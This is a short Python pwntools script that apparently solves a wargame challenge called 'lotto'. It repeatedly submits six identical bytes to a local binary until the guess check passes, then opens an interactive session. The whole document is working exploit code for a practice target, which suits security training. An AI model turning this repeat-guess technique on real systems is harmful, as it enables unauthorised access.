from pwn import *

s = process('/home/lotto/lotto')

lotto = "\x01"*6
while True:
        print s.recvuntil('Exit\n')
        s.sendline('1')
        print s.recvuntil('Submit your 6 lotto bytes : ')
        s.send(lotto)
        print s.recvline()
        result = s.recvline()
        print 'result: ' + result
        if result.startswith('bad luck'):
                continue
        else:
                s.interactive()
                s.close()
                break

